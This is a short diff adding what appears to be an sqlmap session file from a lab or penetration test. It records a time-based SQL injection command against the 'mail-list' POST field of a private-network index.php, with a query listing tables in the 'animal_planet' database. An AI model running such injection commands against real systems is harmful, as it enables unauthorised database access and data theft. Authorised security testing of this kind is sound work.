@@ -1,0 +1,5 @@
+http://192.168.145.48/index.php (POST)  # /usr/bin/sqlmap -u http://192.168.145.48/index.php --data=mail-list=test@test.com --dbms=mysql --technique=T --batch "--sql-query=SELECT table_name FROM 
+  information_schema.tables WHERE 
+  table_schema='animal_planet'" --output-dir ./sqlmap_results_focusd --risk=3 --threads=4 --timeout=30 --delay=0.3
+
+mail-list=test@test.com
